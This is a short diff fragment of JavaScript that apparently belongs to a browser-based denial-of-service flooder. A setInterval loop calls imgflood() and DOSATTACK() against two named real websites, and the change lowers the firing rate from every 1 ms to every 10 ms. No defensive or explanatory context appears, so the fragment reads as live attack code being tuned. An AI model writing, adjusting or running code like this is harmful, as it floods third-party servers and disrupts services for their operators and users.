@@ -21,5 +21,5 @@ setInterval(function(){
   imgflood("http://korea-dpr.com");
   DOSATTACK("http://jihadology.net");
   DOSATTACK("http://korea-dpr.com");
-}, 1);
+}, 10);
 
